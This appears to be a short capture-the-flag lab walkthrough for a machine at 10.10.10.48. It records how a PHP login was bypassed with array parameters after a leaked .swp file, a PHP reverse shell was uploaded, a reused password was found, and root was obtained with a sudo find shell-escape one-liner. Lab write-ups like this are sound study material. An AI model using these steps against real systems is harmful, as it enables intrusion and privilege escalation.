```
Base - 10.10.10.48
```

#Ports Open - 80,22

#Details of Ports
>22		ssh
>80		http

#Findings + Exploitation
>found s website running on port 80
>found a login page on url
	http://<ip>/login/login.php
>checked the login directory and found a "login.php.swp"
>ran strings on it to find php code in reverse at the end
>found a exploit to bypass "=="
>used burp to intercept
>changed
	username=adminpassword=admin
		TO
	username[]=admin&password[]admin
>got in admin section
>uploaded a revshel.php
>found a irectory "uploaded"
>activated the rev shell
>inside the machine looked at the config.php
>found a password for john
	thisisagoodpassword
>ran sudo -l
>find can be run through root
>exploit found on gtfo bins
	sudo find . -exec /bin/sh \; -quit
>got ROOT!!
	51709519ea18ab37dd6fc58096bea949